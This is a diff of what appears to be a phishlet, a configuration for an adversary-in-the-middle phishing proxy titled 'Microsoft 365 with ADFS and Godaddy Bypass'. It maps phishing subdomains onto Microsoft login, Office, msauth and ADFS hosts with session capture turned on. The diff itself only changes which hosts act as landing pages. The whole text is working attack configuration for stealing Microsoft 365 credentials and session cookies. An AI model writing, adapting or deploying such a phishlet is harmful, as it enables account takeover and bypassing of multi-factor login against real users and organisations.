@@ -2,13 +2,13 @@ name: 'Microsoft 365 with ADFS and Godaddy Bypass'
 
 min_ver: '3.1.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: true}
   - {phish_sub: '', orig_sub: '', domain: 'microsoftonline.com', session: true, is_landing: false}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false}
   - {phish_sub: 'office365', orig_sub: 'outlook', domain: 'office365.com', session: false, is_landing: false}
   - {phish_sub: 'res', orig_sub: 'r4.res', domain: 'office365.com', session: false, is_landing: false}
-  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com', session: true, is_landing: true}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com', session: true, is_landing: false}
   - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com:443', session: true, is_landing: false}
 
 ## ADD BELOW HOST ACCORDING TO THE SERVICE BEING USED TO LOGIN.
